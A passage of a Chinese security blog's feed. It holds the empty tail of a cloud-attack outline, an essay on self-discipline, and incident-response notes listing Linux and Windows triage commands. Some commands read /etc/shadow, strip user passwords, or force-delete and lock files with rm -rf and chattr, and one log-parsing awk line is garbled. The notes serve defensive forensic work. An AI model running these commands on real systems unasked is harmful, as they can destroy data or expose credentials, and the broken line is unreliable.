title="云服务器攻击方式"></a>云服务器攻击方式</h3><p>1. </p><h2 id="窃取凭据"><a href="#窃取凭据" class="headerlink" title="窃取凭据"></a>窃取凭据</h2><h3 id="云服务器攻击方式-5"><a href="#云服务器攻击方式-5" class="headerlink" title="云服务器攻击方式"></a>云服务器攻击方式</h3><p>1. </p><h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><h3 id="云服务器攻击方式-6"><a href="#云服务器攻击方式-6" class="headerlink" title="云服务器攻击方式"></a>云服务器攻击方式</h3><p>1. </p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="云服务器攻击方式-7"><a href="#云服务器攻击方式-7" class="headerlink" title="云服务器攻击方式"></a>云服务器攻击方式</h3><p>1. </p><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B&quot;&gt;整体流程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE&quot;&gt;初始访</summary>
      
    
    
    
    
    <category term="云安全" scheme="https://yinwc.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>人生的灯塔</title>
    <link href="https://yinwc.github.io/2023/03/06/%E8%87%AA%E5%BE%8B/"/>
    <id>https://yinwc.github.io/2023/03/06/%E8%87%AA%E5%BE%8B/</id>
    <published>2023-03-06T09:52:25.000Z</published>
    <updated>2023-04-21T06:33:33.799Z</updated>
    
    <content type="html"><![CDATA[<h1 id="感悟与思考"><a href="#感悟与思考" class="headerlink" title="感悟与思考"></a>感悟与思考</h1><ul><li>每当你行至命运的三岔路口，踌躇不决的时候可能命运早就给你画好了以后的人生路。</li><li>严格的自律和时间管理，是人与人产生差距非常重要的原因，超过智商因素。</li><li>人的一生，注定会遇见很多人，有人可以陪你到最后，可有人只能教会你成长。</li></ul><h1 id="自律，决定一生！"><a href="#自律，决定一生！" class="headerlink" title="自律，决定一生！"></a>自律，决定一生！</h1><h2 id="胸中藏有大志的人，往往是一个很自律的人"><a href="#胸中藏有大志的人，往往是一个很自律的人" class="headerlink" title="胸中藏有大志的人，往往是一个很自律的人"></a>胸中藏有大志的人，往往是一个很自律的人</h2><ul><li>重庆谈判中，蒋介石曾对秘书陈布雷说：“毛泽东不可轻视。他嗜烟如命，但他知道我不吸烟后，在同我谈话期间，竟绝不抽一支。对他的决心和精神，不可小视!”</li><li>自律的人，既可怕，又可敬。如果是伙伴，你要跟他学会律己;如果是对手，你要做好足够的心理准备。 </li><li>以前总觉得，人生苦短，应及时行乐。今朝有酒今朝醉，人不风流枉少年。直到后来，我渐渐发现：每一个不自律的行为，都会给你带来更大的痛苦。不要做欲望的奴隶，自律可以令我们活得更高级。 </li><li>自由的本质不是放纵自己，不是无所不为，而是自律之后的舒畅，是有所为，有所不为!</li></ul><h2 id="人为什么要自律"><a href="#人为什么要自律" class="headerlink" title="人为什么要自律"></a>人为什么要自律</h2><ul><li>很多时候，我们只看到了别人优秀的样子，却往往忽略了他们为此付出了近乎自虐般的努力。 </li><li>一个自律到骨子里的人，看上去大多是无趣的。 <ul><li>在别人出去玩乐的时候，一个人窝在那里看书;在别人享用着美食的时候，在健身房里挥汗如雨;周末的时光，很多人慵懒地睡到中午，他依旧雷打不动的早起、跑步、看书、工作… 这样的人，不仅看起来无趣，甚至感觉有自虐倾向，活得一点都不洒脱和自由。但真实情况是，自律的人比不自律的人要自由得多。</li></ul></li><li>如果你总是随心所欲，讲究及时行乐，不知道努力，别人玩你也玩，别人努力你还在玩，依旧放纵自己。 </li><li>那么如此不自律的你，现在看似是自由的，但你会发现自己越活越没有自由，没有选择的资本。</li><li>康德说，所谓自由，不是随心所欲，而是自我主宰。 </li><li>越自律，越有话语权，身体和人生都是如此。 </li><li>一天两天看不出来，一个月两个月也许还是看不出来，但是一年两年，甚至十年二十年，自律的人和不自律的人，终将走上截然不同的道路。 </li><li>付出和回报是成正比的，量变足够了才可能促成质变。</li><li>这就是一个人为什么要自律的原因，和梦想沾不上边，就是简简单单地为自己以后能真正自由一点，身体和人生都自由一点。</li><li>越是自律的人越明白自己真正想要的是什么，所以才不会把时间和精力白白浪费在无意义的事情上，而是真的把碎片化时间都利用起来成长自己。</li></ul><h2 id="所有优秀，背后都有苦行僧般的自律"><a href="#所有优秀，背后都有苦行僧般的自律" class="headerlink" title="所有优秀，背后都有苦行僧般的自律"></a>所有优秀，背后都有苦行僧般的自律</h2><ul><li>说要自律的人很多，可坚持自律的人很少，就像爬一座险峻的高山，越临近山顶，能够咬牙坚持往前走的人越少。 </li><li>好的坚持，本身就是一种自律。 </li><li>还记得去年的时候，一位名叫沈华的96岁老爷爷走红网络，健身26年的他体格健壮，完全不像一个近百岁的老人，大家都喊他“华仔”、“华叔”。 </li><li>沈老每天的作息时间非常规律，从不超过晚上十点睡觉，早晨四点多就起床活动身体，每天下午到健身房报到。 </li><li>他的同龄人很多都已经不在了，沈老说：“现在健身和运动是我最好的朋友”。 </li><li>七十多岁的沈华最初进健身房，总遭遇很多白眼，很多人都觉得他一把年纪，肯定坚持不了多久，可现实是，很多年轻人只是健身房的过客，沈华却用二十年变成了为人熟知的“肌肉爷爷”。</li><li>日本作家村上春树从30岁开始写作，至今已快有40个年头，创作出了大量的作品，经典又高产。 </li><li>村上春树写作有个习惯，他每天只写4000字，400字一页的纸，每天写到10页就停下来。 </li><li>另外，他每天都会拿出一个小时出来跑步，雷打不动，正是这种高度自律，让他有精力能够持续产出优秀的作品出来。 </li><li>很多时候，不是优秀才自律，而是你自律了，才会变得优秀。而那些自律的人，往往连老天爷都不忍心辜负他们。</li></ul><h2 id="越自律，越优秀"><a href="#越自律，越优秀" class="headerlink" title="越自律，越优秀"></a>越自律，越优秀</h2><ul><li>《认知突围》中有句话说：所有的懒惰、放纵、自制力不足，根源都在于认知能力受限。 </li><li>越自律，认知能力越强，人和人的差距，就是这样逐渐拉开的。 </li><li>一个人的自律中，藏着无限的可能性，你自律的程度，决定着你人生的高度。 </li><li>每个人都有权利选择怎样活着，有人认为人生苦短，要及时行乐，没有问题，但我想告诉你，自律的人生其实更加美好，因为当你知道自己想要去哪儿并且全力以赴奔跑的时候，全世界都会为你让路。 </li><li>真正能够登顶远眺的人，永远是那些心无旁骛，坚持着往前走的人。 </li><li>愿我们真正成为自律的自己，活成自己喜欢的样子，过上自己想要的生活。 </li><li>人生没有近路可走，但你走的每一步，都算数。 </li><li>越勤奋，越努力;越自律，越优秀。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;感悟与思考&quot;&gt;&lt;a href=&quot;#感悟与思考&quot; class=&quot;headerlink&quot; title=&quot;感悟与思考&quot;&gt;&lt;/a&gt;感悟与思考&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;每当你行至命运的三岔路口，踌躇不决的时候可能命运早就给你画好了以后的人生路。&lt;/li&gt;
&lt;li&gt;严格的自</summary>
      
    
    
    
    
    <category term="learn" scheme="https://yinwc.github.io/tags/learn/"/>
    
  </entry>
  
  <entry>
    <title>应急响应笔记</title>
    <link href="https://yinwc.github.io/2022/06/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/"/>
    <id>https://yinwc.github.io/2022/06/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/</id>
    <published>2022-06-18T02:41:40.000Z</published>
    <updated>2023-07-21T00:47:38.733Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94">应急响应</a></li><li><a href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A6%82%E5%BF%B5">应急响应概念</a><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94">什么是应急响应</a></li><li><a href="#%E5%8E%9F%E5%88%99%E5%92%8C%E6%8C%87%E5%AF%BC%E6%80%A7%E6%80%9D%E8%B7%AF3w1h">原则和指导性思路3W1H</a></li><li><a href="#%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B">基本流程</a></li><li><a href="#%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E6%BC%94%E7%BB%83%E5%86%85%E5%AE%B9">安全应急演练内容</a></li><li><a href="#%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84">法律法规</a><ul><li><a href="#%E5%9B%BD%E5%AE%B6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%BA%94%E6%80%A5%E9%A2%84%E6%A1%88">《国家网络安全事件应急预案》</a></li></ul></li></ul></li><li><a href="#%E5%BA%94%E6%80%A5%E4%B9%8B%E6%8E%92%E6%9F%A5%E6%96%B9%E6%B3%95">应急之排查方法</a><ul><li><a href="#linux%E4%B8%8B%E6%8E%92%E6%9F%A5%E6%96%B9%E6%B3%95">Linux下排查方法</a><br>  - <a href="#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF">、查看用户信息</a><br>  - <a href="#%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4">、历史命令</a><br>  - <a href="#%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3">、查看端口</a><br>  - <a href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B">、查看进程</a><br>  - <a href="#%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9">、开机启动项</a><br>  - <a href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1">、定时任务</a><br>  - <a href="#%E6%9C%8D%E5%8A%A1">、服务</a><br>  - <a href="#%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6">、查找文件</a><br>  - <a href="#top%E5%91%BD%E4%BB%A4">、top命令</a><br>  - <a href="#host%E6%96%87%E4%BB%B6">、host文件</a><br>  - <a href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90">、日志分析</a><br>  - <a href="#%E6%9F%A5%E7%9C%8B%E5%91%BD%E4%BB%A4%E7%8A%B6%E6%80%81">、查看命令状态</a><br>  - <a href="#%E6%96%87%E4%BB%B6%E6%B8%85%E9%99%A4">、文件清除</a><ul><li><a href="#windows%E4%B8%8B%E6%8E%92%E6%9F%A5%E6%96%B9%E6%B3%95">windows下排查方法</a><ul><li><a href="#%E4%B8%80%E8%B4%A6%E5%8F%B7%E5%AE%89%E5%85%A8">一、账号安全</a></li><li><a href="#%E4%BA%8C%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3%E8%BF%9B%E7%A8%8B">二、检查异常端口进程</a></li><li><a href="#%E4%B8%89%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%A3%80%E6%9F%A5">三、启动项检查</a></li><li><a href="#%E5%9B%9B%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1">四、查看系统定时任务</a></li><li><a href="#%E4%BA%94%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1">五、查看系统服务</a></li><li><a href="#%E5%85%AD%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B">六、文件查看</a></li></ul></li></ul></li></ul></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h1 id="应急响应概念"><a href="#应急响应概念" class="headerlink" title="应急响应概念"></a>应急响应概念</h1><h2 id="什么是应急响应"><a href="#什么是应急响应" class="headerlink" title="什么是应急响应"></a>什么是应急响应</h2><ul><li>“应急响应”对应的英文是“Incident Response”或“Emergency Response”等，通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。</li><li>应急响应的活动应该主要包括两个方面：<br>第一、未雨绸缪，即在事件发生前事先做好准备，比如风险评估、制定安全计划、安全意识的培训、以发布安全通告的方式进行的预警、以及各种防范措施；<br>第二、亡羊补牢，即在事件发生后采取的措施，其目的在于把事件造成的损失降到最小。这些行动措施可能来自于人，也可能来自系统，不如发现事件发生后，系统备份、病毒检测、后门检测、清除病毒或后门、隔离、系统恢复、调查与追踪、入侵者取证等一系列操作</li></ul><h2 id="原则和指导性思路3W1H"><a href="#原则和指导性思路3W1H" class="headerlink" title="原则和指导性思路3W1H"></a>原则和指导性思路3W1H</h2><ul><li>原则：3W即Who、What、Why，1H即How，做应急响应要带着疑问来做事，一定要收集清楚这些信息。包括网络拓扑、应急响应的需求、发生的事件、如何处置、用户使用产品的详情，反病毒库版本多少？多少主机中了？主机是普通PC还是服务器？服务器是做什么的？……信息收集越多，对应急响应越有利。<ul><li>易失性原则：应急响应需要信息收集和取证，但这里是有一定的先后顺序的，即最容易丢失的数据，应该最先收集，其它的依次类推。</li><li>要素原则：做应急响应，主要是抓关键证据，即要素，这些要素包括样本、流量、日志、进程及模块、内存、启动项。</li><li>避害原则：做应急响应，要做到趋利避害，不能问题还没有解决，反而引入了新的问题。譬如，自己使用的工具被感染而不知情；给用户使用不恰当的工具或软件造成客户主机出现问题；给别人发样本，不加密，不压缩，导致别人误点中毒，最极端的场景就是给别人发勒索样本不加密压缩，导致别人误点中毒。</li></ul></li></ul><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>应急响应大致可以分为五个部分，其基本流程包括收集信息、判断类型、深入分析、清理处置、产出报告。</p><ul><li>收集信息：收集客户信息和中毒主机信息，包括样本。</li><li>判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDoS等等。</li><li>深入分析：日志分析、进程分析、启动项分析、样本分析。</li><li>清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件。</li><li>产出报告：整理并输出完整的安全事件报告。</li></ul><h2 id="安全应急演练内容"><a href="#安全应急演练内容" class="headerlink" title="安全应急演练内容"></a>安全应急演练内容</h2><p>● 配合用户定期开展安全应急演练工作，目的是检验用户安全保障体系是否具备安全事件的监测能力、应急演练预案是否合适、用户安全运维人员是否有基本的安全事件处置能力等。<br>● 安全应急演练内容包括但不限于应急演练方案的制定、演练用例的生成、演练结果的评估等，演练用例应涵盖常见的安全事件，如DDOS攻击、蠕虫、木马等，演练方式可参考红蓝对抗方式；<br>● 在生成应急演练用例时，应先获得用户的授权。所生成用例的影响大小、持续时间、影响范围应完全可控，不能对用户业务系统造成不可恢复的破坏性影响；<br>● 演练结束后，应提供安全应急演练报告，报告内容应包含但不限于安全应急演练过程、甲方安全保障体系缺陷、应急预案弱点、安全运维人员的安全事件处置能力评测以及相应的改进建议。</p><h2 id="法律法规"><a href="#法律法规" class="headerlink" title="法律法规"></a>法律法规</h2><h3 id="《国家网络安全事件应急预案》"><a href="#《国家网络安全事件应急预案》" class="headerlink" title="《国家网络安全事件应急预案》"></a>《国家网络安全事件应急预案》</h3><p>2017年6月，中央网信办公布了《国家网络安全事件应急预案》。习近平总书记指出，网络安全是动态的而不是静态的，是相对的而不是绝对的。维护网络安全必须“防患于未然”。制定《国家网络安全事件应急预案》是网络安全的一项基础性工作，是落实国家《突发事件应对法》的需要，更是实施《网络安全法》、加强国家网络安全保障体系建设的本质要求。<br>《网络安全法》第五十三条要求，国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。这个预案指的便是《国家网络安全事件应急预案》，《网络安全法》授权国家网信部门牵头制定。同时，《网络安全法》要求，网络运营者应当制定网络安全事件应急预案；负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案。这些预案都要在《国家网络安全事件应急预案》的总体框架下分别制定。<br>不仅如此，《网络安全法》中若干处提到的有关“规定”也是指《国家网络安全事件应急预案》。如第二十五条要求，在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告；第五十一条要求，国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息；第五十二条要求，负责关键信息基础设施安全保护工作的部门，应当按照规定报送网络安全监测预警信息。《国家网络安全事件应急预案》均对上述事项作出了规定。我国的国家级网络安全应急预案最早制定于 2008 年，即《国家网络与信息安全事件应急预案》，以国办名义印发。中央网络安全和信息化领导小组成立后，结合实际情况对该预案进行了修订，但以上预案都没有对社会公开。网络安全是共同的而不是孤立的，此次将修订后的国家网络安全应急预案公开印发，就是为了使全社会周知《国家网络安全事件应急预案》的内容，形成共同应对网络安全重大事件的局面。同时，为了更好地指导各级各类网络安全预案的制定，构建科学合理、有机统一的国家网络安全应急预案体系。</p><h1 id="应急之排查方法"><a href="#应急之排查方法" class="headerlink" title="应急之排查方法"></a>应急之排查方法</h1><h2 id="Linux下排查方法"><a href="#Linux下排查方法" class="headerlink" title="Linux下排查方法"></a>Linux下排查方法</h2><h4 id="1、查看用户信息"><a href="#1、查看用户信息" class="headerlink" title="1、查看用户信息"></a>1、查看用户信息</h4><p>&#x2F;etc&#x2F;passwd 查看用户信息文件<br>&#x2F;etc&#x2F;shadow 查看影子文件<br>awk -F: ‘$3&#x3D;&#x3D;0{print $1}’ &#x2F;etc&#x2F;passwd （查看系统是否还存在其他的特权账户，uid为0，默认系统只存在root一个特权账户）</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135467060-a8b8f04a-5394-4ed9-819c-9fafc5ad6b70.png" alt="图片.png"></p><p>who 查看当前登录用户（tty 本地登陆 pts 远程登录）</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135472229-82d24d9a-cad7-44f5-900a-d045b4944afc.png" alt="图片.png"></p><p>w 查看系统信息，想知道某一时刻用户的行为</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135477018-9031ae31-2d33-4d1a-a3bb-fbab53216a3c.png" alt="图片.png"></p><p>uptime 查看登陆多久、多少用户，负载</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135482334-60c4299b-7c90-4d0c-b1c0-7c8e39627a73.png" alt="图片.png"></p><p>passwd -d username 删除用户口令</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135487012-596e7c7f-901a-45f7-83c3-92454fa92945.png" alt="图片.png"></p><p>stat &#x2F;etc&#x2F;passwd #查看密码文件上一次修改的时间，如果最近被修改过，那就可能存在问题。</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135496060-bdee85cd-1fe1-47a7-9575-cc517ebf271e.png" alt="图片.png"></p><p>cat &#x2F;etc&#x2F;passwd | grep -v nologin #查看除了不可登录以外的用户都有哪些，有没有新增的</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135501168-2797f528-d4eb-45a5-bb0f-361fdc432673.png" alt="图片.png"></p><p>cat &#x2F;etc&#x2F;passwd | grep x:0 #查看哪些用户为root权限，有没有新增的</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135506738-85a8b306-c6af-401b-98b2-e12926ca9c0a.png" alt="图片.png"></p><p>cat &#x2F;etc&#x2F;passwd | grep &#x2F;bin&#x2F;bash #查看哪些用户使用shell</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135515249-60da4fa2-6e31-49a6-94e1-0c7bcfdbdb68.png" alt="图片.png"></p><p>查询可以远程登录的账号：awk ‘&#x2F;$1|$6&#x2F;{print $1}’ &#x2F;etc&#x2F;shadow<br>查询具有sudo权限的账号：more &#x2F;etc&#x2F;sudoers | grep -v “^#|^$” grep “ALL&#x3D;(ALL)”</p><h4 id="2、历史命令"><a href="#2、历史命令" class="headerlink" title="2、历史命令"></a>2、历史命令</h4><p>很多的服务器会有存在多用户登陆情况，登陆root用户可查看其他用户的相关账户登录信息,.bash_history保存了用户的登陆所操作的命令信息<br>home&#x2F;root&#x2F;.bash_history<br>history查看历史命令</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135545267-ace7e4cc-7e65-488a-915b-cd82b7eaeaac.png" alt="图片.png"></p><p>cat .bash_history &gt;&gt;history.txt 保存历史命令</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135551079-6acf3754-0718-4854-af45-37fb1a34f164.png" alt="图片.png"></p><h4 id="3、查看端口"><a href="#3、查看端口" class="headerlink" title="3、查看端口"></a>3、查看端口</h4><p>netstat –antp</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135555846-793d4407-1404-4639-b4fa-e4739f7d1954.png" alt="图片.png"></p><p>查看对应链接的文件路径<br>ls -l &#x2F;proc&#x2F;pid&#x2F;exe</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135560937-978464ac-b331-4d5c-8e40-2c7ec5eea992.png" alt="图片.png"></p><p>ls -l &#x2F;proc&#x2F;*&#x2F;exe | grep xxx #如果我们知道恶意程序的启动文件大致位置，可以使用这个发现无文件的恶意进程</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135565915-b6968cc0-6345-4531-8e94-83c29ddfc36d.png" alt="图片.png"></p><p>netstat -antlp | grep 172.16.222.198 | awk ‘{print $7}’ | cut -f1 -d”&#x2F;“ 通过可疑的ip地址获取程序pid</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135571761-e2f66b3d-ad71-4a16-b584-d5ca3e2e2d7e.png" alt="图片.png"></p><h4 id="4、查看进程"><a href="#4、查看进程" class="headerlink" title="4、查看进程"></a>4、查看进程</h4><p>ps -aux</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135576677-7e53fa37-f470-4d8d-bce4-6dc724a38eca.png" alt="图片.png"></p><p>查看相关pid对应程序<br>ps –aux | grep pid</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135581322-368022a2-561e-4e03-8456-7a0f480c5a37.png" alt="图片.png"></p><p>监控某一应用线程数（如ssh）<br>ps -eLf | grep ssh| wc –l<br>监控网络客户连接数<br>netstat -n | grep tcp | grep 侦听端口 | wc -l</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135586472-23e1edc0-a66d-494e-ac91-e74eba7279bc.png" alt="图片.png"></p><p>ps aux –sort&#x3D;pcpu | head -10 查看cpu占用率前十的进程，有时候可以发现</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135592002-a9c89006-6a1b-40e2-8aed-aa91499fe311.png" alt="图片.png"></p><h4 id="5、开机启动项"><a href="#5、开机启动项" class="headerlink" title="5、开机启动项"></a>5、开机启动项</h4><p>启动项文件：<br>more &#x2F;etc&#x2F;rc.local<br>&#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d<br>ls -l &#x2F;etc&#x2F;rc.d&#x2F;rc3.d&#x2F;</p><h4 id="6、定时任务"><a href="#6、定时任务" class="headerlink" title="6、定时任务"></a>6、定时任务</h4><p>crontab -l</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135597989-1b362767-51a8-4889-9393-e7c551ebc505.png" alt="图片.png"></p><p>编辑定时任务<br>crontab –e</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135603232-f9ab8ac2-eb16-4a47-9dac-dca043b08b58.png" alt="图片.png"></p><p>crontab -u root –l 查看root用户任务计划<br>ls &#x2F;var&#x2F;spool&#x2F;cron&#x2F; 查看每个用户自己的执行计划</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135609746-49042449-49cc-4e89-a3f5-383df024ea54.png" alt="图片.png"></p><p>#删除计划任务且控制计划任务不能写东西<br>sed ‘&#x2F;gcc.sh&#x2F;d’ &#x2F;etc&#x2F;crontab &amp;&amp; chmod 0000 &#x2F;etc&#x2F;crontab &amp;&amp; chattr +i &#x2F;etc&#x2F;crontab<br>常见的定时任务文件：<br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;* #centos的<br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;* #ubuntu的<br>&#x2F;var&#x2F;spool&#x2F;anacron&#x2F;*<br>&#x2F;etc&#x2F;crontab<br>&#x2F;etc&#x2F;anacrontab #异步定时<br>&#x2F;etc&#x2F;cron.hourly&#x2F;*<br>&#x2F;etc&#x2F;cron.daily&#x2F;*<br>&#x2F;etc&#x2F;cron.weekly&#x2F;<br>&#x2F;etc&#x2F;cron.monthly&#x2F;*</p><h4 id="7、服务"><a href="#7、服务" class="headerlink" title="7、服务"></a>7、服务</h4><p>chkconfig 查看开机启动项目</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135619081-2e9babd0-44f0-4fcc-88fc-1dda5be24c30.png" alt="图片.png"></p><p>chkconfig –list 查看服务自启状态</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135623828-4d2903b3-ef8d-49f3-90d6-9551842893ff.png" alt="图片.png"></p><p>systemctl list-unit-files |grep enabled</p><h4 id="8、查找文件"><a href="#8、查找文件" class="headerlink" title="8、查找文件"></a>8、查找文件</h4><p>find查找指定的文件：find &#x2F;home1 -name *.php ! -name index.php<br>find查看最近一天修改的文件: find &#x2F; -mtime -1 &gt; &#x2F;etc&#x2F;aa.txt(查看修改的文件并保存到aa的txt文档)<br>查找并删除,liyong xargs find . -name .svn | xargs rm –rf<br>find &#x2F; -size +10000k -print：查找大于10000k的文件<br>md5sum -b filename：查看文件的md5值</p><h4 id="9、top命令"><a href="#9、top命令" class="headerlink" title="9、top命令"></a>9、top命令</h4><p>top命令是Linux下常用的性能分析工具，能够实时显示系统中各个进程的资源占用状况，类似于Windows的任务管理器。<br>默认top是根据cpu的占用情况进行排序的</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135632874-3c487fb2-4cc3-4e68-bf1f-13901c223ce0.png" alt="图片.png"></p><p>可通过按“b”键进行切换，可切换到按照内存使用情况进行排序<br>top -p pid 监控指定进程</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135638725-4b3500b0-1dec-487a-9bf5-2cbcc5f86df0.png" alt="图片.png"></p><p>free 查看当前系统内存使用情况</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135643662-732fbc43-1760-466d-a294-f1a871dea7c9.png" alt="图片.png"></p><p>top -b -n1 | head</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135651123-f892d1d4-fc02-49a9-a9d0-6843446251c0.png" alt="图片.png"></p><h4 id="10、host文件"><a href="#10、host文件" class="headerlink" title="10、host文件"></a>10、host文件</h4><p>有一些挖矿程序会修改 &#x2F;etc&#x2F;hosts文件</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135656622-e1b36a5b-3b66-4bfb-8c5e-ff0808dcaf38.png" alt="图片.png"></p><p>Diff<br>Linux中的命令，Diff,可以查看两个文本文件的差异</p><h4 id="11、日志分析"><a href="#11、日志分析" class="headerlink" title="11、日志分析"></a>11、日志分析</h4><p>默认日志位置：var&#x2F;log<br>1、定位有多少IP在爆破主机的root帐号：<br>grep “Failed password for root” &#x2F;var&#x2F;log&#x2F;secure | awk ‘{print _&#x3D;&lt;&gt;){ &#x2F;for(.*?) from&#x2F;; print “$1\n”;}’|uniq -c|sort -nr<br>2、登录成功的IP有哪些：<br>grep “Accepted “ &#x2F;var&#x2F;log&#x2F;secure | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more<br>登录成功的日期、用户名、IP：<br>grep “Accepted “ &#x2F;var&#x2F;log&#x2F;secure | awk ‘{print $1,$2,$3,$9,$11}’</p><h4 id="12、查看命令状态"><a href="#12、查看命令状态" class="headerlink" title="12、查看命令状态"></a>12、查看命令状态</h4><p>很多情况下，存在ps、netstat等一些常见命令被替换，可利用stat查看该状态，查看其修改时间<br>stat &#x2F;bin&#x2F;netstat</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614135794548-8900edab-1e77-4e4f-a3e7-eabc868b4947.png" alt="图片.png"></p><h4 id="13、文件清除"><a href="#13、文件清除" class="headerlink" title="13、文件清除"></a>13、文件清除</h4><p>很多时候会遇到无法常看文件权限或是病毒在一直向某个文件写入程序，可尝试如下命令：<br>lsattr [恶意文件绝对路径]命令查看权限，<br>使用chattr -i [恶意文件绝对路径]解除文件锁定后删除。<br>chmod 0000 &#x2F;lib&#x2F;libudev.so &amp;&amp; rm -rf &#x2F;lib&#x2F;libudev.so &amp;&amp; chattr +i &#x2F;lib&#x2F;（chattr +i不让lib文件被写入删除）<br>结束某一进程：<br>Kill -9 pid</p><h3 id="windows下排查方法"><a href="#windows下排查方法" class="headerlink" title="windows下排查方法"></a>windows下排查方法</h3><h4 id="一、账号安全"><a href="#一、账号安全" class="headerlink" title="一、账号安全"></a>一、账号安全</h4><p>query user 查看当前登录账户</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151128114-a60dbfdb-fcb8-455b-8ca7-2066fe70efee.png" alt="图片.png"> logoff ID 注销用户id<br>net user 查看用户<br>net user username 查看用户登录情况<br>lusrmgr.msc 打开本地用户组</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151133588-28870a2e-6f4b-4629-88af-041fcd000a78.png" alt="图片.png"> regedit注册表查看账户，确认系统是否存在隐藏账户</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151142537-109da461-5234-414b-8117-7acb1e6c2ab5.png" alt="图片.png"> AS Client_IP FROM ‘C:\Users\haha\Desktop\Security.evtx’ WHERE EventID&#x3D;4624”</p><p><img 